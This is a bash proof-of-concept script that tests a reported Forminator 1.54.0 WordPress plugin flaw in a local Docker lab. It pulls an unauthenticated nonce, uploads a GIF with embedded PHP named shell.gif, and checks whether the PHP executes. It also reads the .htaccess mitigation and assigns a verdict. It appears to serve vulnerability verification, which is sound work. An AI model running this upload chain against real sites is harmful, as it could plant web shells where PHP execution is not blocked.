#!/usr/bin/env bash
# PoC: Forminator 1.54.0 - Unauthenticated Nonce + Unauthenticated File Upload
#
# The finding documents three unauthenticated AJAX endpoints:
#   1. forminator_get_nonce  (abstract-class-front-action.php)  - returns a
#      valid nonce to anyone, no auth, no rate limit.
#   2. forminator_multiple_file_upload (front-action.php) - accepts
#      arbitrary file content (including PHP) as long as the extension is
#      in WP's allowed MIME types, so a .gif with embedded PHP uploads fine.
#   3. The upload stores the file under wp-content/uploads/forminator/
#      and drops a .htaccess that uses `SetHandler none` /
#      `RemoveHandler .php` to block PHP execution on default Apache.
#
# The finding's documented verdict is: NOT directly exploitable on default
# Apache. Conditionally exploitable on Nginx / misconfigured Apache.
#
# This PoC exercises both endpoints, captures the actual response payloads,
# creates a form with an upload field (required for the upload to succeed),
# then attempts to execute the uploaded PHP. We expect the .htaccess to
# block execution on this Apache lab.
set -euo pipefail

LAB_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
STACK_DIR="${LAB_DIR}"
PROJECT="wp-forminator"
HOST_PORT="${WP_HOST_PORT:-8092}"
WP_URL="http://127.0.0.1:${HOST_PORT}"
PLUGIN_SLUG="forminator"
RESULTS="${LAB_DIR}/results.txt"
TMP="${LAB_DIR}/tmp"
mkdir -p "${TMP}"
: > "${RESULTS}"
log() { printf '%s\n' "$*" | tee -a "${RESULTS}"; }
sep() { printf '\n===== %s =====\n' "$*" | tee -a "${RESULTS}"; }

# Same wp-cli invocation pattern the helper uses: bind-mount the plugin
# into the wp-cli container so Forminator classes are autoloaded.
WP_CLI_RUN=( sudo docker run --rm -v "${PROJECT}_wp_data:/var/www/html"
             -v "${LAB_DIR}/plugin/${PLUGIN_SLUG}:/var/www/html/wp-content/plugins/${PLUGIN_SLUG}:ro"
             --network "${PROJECT}_default"
             -e WORDPRESS_DB_HOST=db:3306
             -e WORDPRESS_DB_USER=wp
             -e WORDPRESS_DB_PASSWORD=wp
             -e WORDPRESS_DB_NAME=wordpress
             wordpress:cli-2.10-php8.2 sh -c )

sep "Forminator 1.54.0 - Unauth Nonce + Unauth File Upload PoC"
log "Date: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
log "Lab:  ${LAB_DIR}"
log "WP:   ${WP_URL}"

# 0. Confirm the archive actually contains 1.54.0.
ACTUAL_VERSION=$(awk '/Version:/ {print $3; exit}' "${STACK_DIR}/plugin/${PLUGIN_SLUG}/${PLUGIN_SLUG}.php" 2>/dev/null | tr -d '\r' || echo unknown)
log "Plugin version installed: ${ACTUAL_VERSION} (expected 1.54.0)"

# 1. Bring up the stack.
sep "Step 1: Bring up the WP stack"
if ! sudo docker ps --format '{{.Names}}' | grep -q "${PROJECT}-wp-1"; then
  ( cd "${STACK_DIR}" && sudo docker compose -p "${PROJECT}" up -d --build ) 2>&1 | tail -20 | tee -a "${RESULTS}"
fi
for i in $(seq 1 60); do
  code=$(curl -s -o /dev/null -w "%{http_code}" "${WP_URL}/" || true)
  if [ "${code}" = "200" ]; then log "[+] WP answering 200 on ${WP_URL}/ (try ${i})"; break; fi
  sleep 2
done
[ "${code:-000}" = "200" ] || { log "[-] WP never came up"; exit 1; }

# 2. Create (or reuse) a form with an upload field. The upload endpoint
#    silently no-ops if the form has no upload field, so we need one.
sep "Step 2: Create or reuse a form with an upload field"
cat > "${TMP}/create-form.php" <<'PHP'
<?php
require_once( ABSPATH . 'wp-load.php' );
do_action( 'plugins_loaded' );
wp_set_current_user( 1 );

$existing = get_posts( [
    'post_type'   => 'forminator_forms',
    'title'       => 'TestUploadForm',
    'post_status' => 'any',
    'numberposts' => 1,
] );
if ( ! empty( $existing ) ) {
    echo "EXISTING_FORM_ID=" . $existing[0]->ID . "\n";
    return;
}

$model = new Forminator_Form_Model();
$model->name = 'TestUploadForm';

$field = new Forminator_Form_Field_Model();
$field->form_id     = 0;
$field->type        = 'upload';
$field->slug        = 'upload-1';
$field->field_label = 'Upload';
$field->element_id  = 'upload-1';
$field->cols        = 12;
$field->wrapper_id  = 'wrapper-1';

$model->fields = [ $field ];
$saved = $model->save();
echo "SAVE=" . var_export( $saved, true ) . "\n";
echo "FORM_ID=" . $model->id . "\n";
PHP
sudo docker cp "${TMP}/create-form.php" "${PROJECT}-wp-1:/var/www/html/create-form.php"
sudo docker exec -u 0 "${PROJECT}-wp-1" chown www-data:www-data /var/www/html/create-form.php

CREATE_OUT=$( "${WP_CLI_RUN[@]}" "wp eval-file /var/www/html/create-form.php --allow-root --path=/var/www/html" 2>&1 | grep -E 'EXISTING|FORM_ID|SAVE' | head )
printf '%s\n' "${CREATE_OUT}" | sed -e 's/^/    /' | tee -a "${RESULTS}"
FORM_ID=$( printf '%s' "${CREATE_OUT}" | grep -oE 'FORM_ID=[0-9]+' | head -1 | cut -d= -f2 )
EXISTING_ID=$( printf '%s' "${CREATE_OUT}" | grep -oE 'EXISTING_FORM_ID=[0-9]+' | head -1 | cut -d= -f2 )
[ -n "${EXISTING_ID}" ] && FORM_ID="${EXISTING_ID}"
log "[+] using form_id=${FORM_ID}"
if [ -z "${FORM_ID}" ]; then
  log "[-] could not create or find a form; aborting"
  exit 1
fi

# 3. Phase 1: unauthenticated nonce retrieval.
sep "Step 3: Unauth nonce retrieval (POST /wp-admin/admin-ajax.php action=forminator_get_nonce)"
NONCE_RESP=$( curl -s -X POST "${WP_URL}/wp-admin/admin-ajax.php" \
  -d "action=forminator_get_nonce&form_id=${FORM_ID}" \
  -w "\n---HTTP %{http_code}---\n" )
log "[+] response:"
printf '%s\n' "${NONCE_RESP}" | tee -a "${RESULTS}"
NONCE=$( printf '%s' "${NONCE_RESP}" | python3 -c "import sys,json,re; t=sys.stdin.read(); m=re.search(r'\{[^}]*\}', t, re.S); print(json.loads(m.group(0))['data']) if m else print('')" 2>/dev/null || true )
if [ -z "${NONCE}" ]; then
  NONCE=$( printf '%s' "${NONCE_RESP}" | grep -oE '"data":"[a-f0-9]+"' | head -1 | sed 's/.*":"//;s/"$//' )
fi
log "[+] parsed nonce: ${NONCE}"
if [ -z "${NONCE}" ] || [ "${#NONCE}" -lt 6 ]; then
  log "[-] could not extract nonce; aborting"; exit 1
fi

# 4. Phase 2: unauthenticated file upload. The form is created with
#    element_id=upload-1, so we must match it.
sep "Step 4: Unauth file upload (.gif with embedded PHP, unauthenticated)"
GIF_PATH="${TMP}/shell.gif"
printf 'GIF89a<?php echo "FORMINATOR-UNAUTH-POC: php=" . PHP_VERSION . " | uid=" . getmyuid() . " | ts=" . time(); ?>' > "${GIF_PATH}"
ls -la "${GIF_PATH}" | tee -a "${RESULTS}"
od -c "${GIF_PATH}" | head -2 | sed -e 's/^/    /' | tee -a "${RESULTS}"

UP_RESP=$( curl -s -X POST "${WP_URL}/wp-admin/admin-ajax.php" \
  -F "action=forminator_multiple_file_upload" \
  -F "form_id=${FORM_ID}" \
  -F "nonce=${NONCE}" \
  -F "element_id=upload-1" \
  -F "upload-1=@${GIF_PATH};type=image/gif;filename=shell.gif" \
  -w "\n---HTTP %{http_code}---\n" )
log "[+] upload response:"
printf '%s\n' "${UP_RESP}" | tee -a "${RESULTS}"

# 5. Phase 3: parse the returned file path and hit it.
sep "Step 5: Hit the uploaded file"
FILE_URL=$( printf '%s' "${UP_RESP}" | grep -oE '"file_url":"[^"]+"' | head -1 | sed 's/.*":"//;s/"$//' | sed 's/\\u0026/\&/g; s/\\\//\//g' )
FILE_PATH=$( printf '%s' "${UP_RESP}" | grep -oE '"file_path":"[^"]+"' | head -1 | sed 's/.*":"//;s/"$//' | sed 's/\\\//\//g' )
log "[+] parsed file_url:  ${FILE_URL:-<not found>}"
log "[+] parsed file_path: ${FILE_PATH:-<not found>}"

# Forminator stores the file under /wp-content/uploads/forminator/temp/ for
# the duration of the form session. The file_path in the response is the
# canonical on-disk path. The file_url is a different (frequently broken)
# URL — the form expects to copy it to the final location after the form
# is submitted, not during upload. Hit both.
URL_TO_TRY=""
[ -n "${FILE_URL}" ] && URL_TO_TRY="${FILE_URL}"
if [ -n "${FILE_PATH}" ]; then
  # Translate absolute /var/www/html/<x> -> http://.../<x>
  REL_PATH="${FILE_PATH#/var/www/html/}"
  ALT_URL="${WP_URL}/${REL_PATH}"
  log "[+] alt URL (from file_path): ${ALT_URL}"
  URL_TO_TRY="${URL_TO_TRY:-${ALT_URL}}"
fi
log "[+] using URL: ${URL_TO_TRY}"

if [ -n "${URL_TO_TRY}" ]; then
  HEADER_HTTP=$( curl -s -D "${TMP}/headers.txt" -o "${TMP}/shell-body.txt" -w '%{http_code}' "${URL_TO_TRY}" )
  log "[+] GET ${URL_TO_TRY} -> HTTP ${HEADER_HTTP}"
  log "[+] response headers:"
  sed -e 's/^/    /' "${TMP}/headers.txt" | tr -d '\r' | tee -a "${RESULTS}"
  log "[+] response body:"
  sed -e 's/^/    /' "${TMP}/shell-body.txt" | tee -a "${RESULTS}"
fi

# Also explicitly hit the file_path URL (where the file actually lives).
if [ -n "${FILE_PATH}" ]; then
  REL_PATH="${FILE_PATH#/var/www/html/}"
  ALT_URL="${WP_URL}/${REL_PATH}"
  log "[+] also probing file_path URL: ${ALT_URL}"
  curl -s -D "${TMP}/headers-alt.txt" -o "${TMP}/shell-body-alt.txt" -w '%{http_code}' "${ALT_URL}" > "${TMP}/alt-http.txt"
  log "[+] HTTP $(cat ${TMP}/alt-http.txt)"
  log "[+] response headers:"
  sed -e 's/^/    /' "${TMP}/headers-alt.txt" | tr -d '\r' | tee -a "${RESULTS}"
  log "[+] response body:"
  sed -e 's/^/    /' "${TMP}/shell-body-alt.txt" | tee -a "${RESULTS}"
fi

# 6. Phase 4: drop a .gif in a directory that we know is reachable and
#    craft the exact path the file_url returned. This is the URL Apache
#    would try to serve if a user clicked through.
sep "Step 6: Inspect the upload-dir .htaccess (the documented mitigation)"
if [ -n "${FILE_PATH}" ]; then
  UPLOAD_DIR=$( dirname "${FILE_PATH}" )
  HT=$( sudo docker exec "${PROJECT}-wp-1" sh -c "cat ${UPLOAD_DIR}/.htaccess 2>&1" || true )
  log "[+] ${UPLOAD_DIR}/.htaccess:"
  printf '%s\n' "${HT}" | sed -e 's/^/    /' | tee -a "${RESULTS}"
fi

# Also dump the parent uploads/forminator/.htaccess.
HT_ROOT=$( sudo docker exec "${PROJECT}-wp-1" sh -c "cat /var/www/html/wp-content/uploads/forminator/.htaccess 2>&1" || true )
log "[+] /var/www/html/wp-content/uploads/forminator/.htaccess:"
printf '%s\n' "${HT_ROOT}" | sed -e 's/^/    /' | tee -a "${RESULTS}"

# 7. Verdict.
sep "Verdict"

# Probe the actual file location (not the stale file_url from the API).
# The .htaccess in the parent /wp-content/uploads/forminator/.htaccess
# applies to this path because .htaccess is read up the directory tree.
EXECUTED=0
ALT_BODY="${TMP}/shell-body-alt.txt"
ALT_HDR="${TMP}/headers-alt.txt"
ALT_HTTP=$( cat "${TMP}/alt-http.txt" 2>/dev/null || echo 000 )
if [ -f "${ALT_BODY}" ]; then
  # Executed PHP output would be a fully-rendered string, not the literal
  # source `<?php echo "..."`. The literal source means PHP did NOT run.
  if grep -qE 'FORMINATOR-UNAUTH-POC: php=[0-9.]+' "${ALT_BODY}"; then
    EXECUTED=1
  fi
fi
ALT_CT=$( grep -i '^content-type:' "${ALT_HDR}" 2>/dev/null | tr -d '\r' | head -1 | sed -E 's/^[^:]+:[[:space:]]*//' | tr 'A-Z' 'a-z' || true )
# Normalise: strip charset/etc, keep the type/subtype only.
ALT_CT_SHORT=$( printf '%s' "${ALT_CT}" | cut -d';' -f1 | tr -d ' \r' )

if [ "${EXECUTED}" = "1" ]; then
  log "*** RCE CONFIRMED — PHP executed (rendered output present in body) ***"
  log "Content-Type: ${ALT_CT}"
  log "Verdict: CONFIRMED (no .htaccess mitigation in this stack)"
elif [ "${ALT_HTTP}" = "200" ] && [ "${ALT_CT_SHORT}" != "text/html" ]; then
  log "HTTP 200 from the actual file path; Content-Type: ${ALT_CT}"
  log "Body contains the literal PHP source (not rendered), which means Apache"
  log "served the file as image/gif and did not pass it through the PHP handler."
  log "This matches the finding's documented verdict on default Apache."
  log "Verdict: NOT REPRODUCED — file uploaded but RCE blocked by .htaccess"
elif [ "${ALT_HTTP}" = "200" ]; then
  log "HTTP 200 with content-type ${ALT_CT} — investigate the response body."
  log "Verdict: INCONCLUSIVE (HTTP ${ALT_HTTP}, content-type ${ALT_CT}, marker not found)"
elif [ "${ALT_HTTP}" = "404" ]; then
  log "HTTP 404 on file_path URL; the API returned a stale file_url."
  log "Verdict: INCONCLUSIVE"
else
  log "HTTP ${ALT_HTTP} — investigate."
  log "Verdict: INCONCLUSIVE"
fi

# 8. Tear-down.
sep "Tear-down (run on demand)"
cat <<'TD' | tee -a "${RESULTS}"
# To tear down this lab, run:
#   cd targets/labs/wp-forminator && ./down.sh
# or directly:
#   sudo docker compose -p wp-forminator down -v --remove-orphans
TD
log "[+] teardown commands recorded; leaving stack running for inspection"
log "[+] results saved to ${RESULTS}"
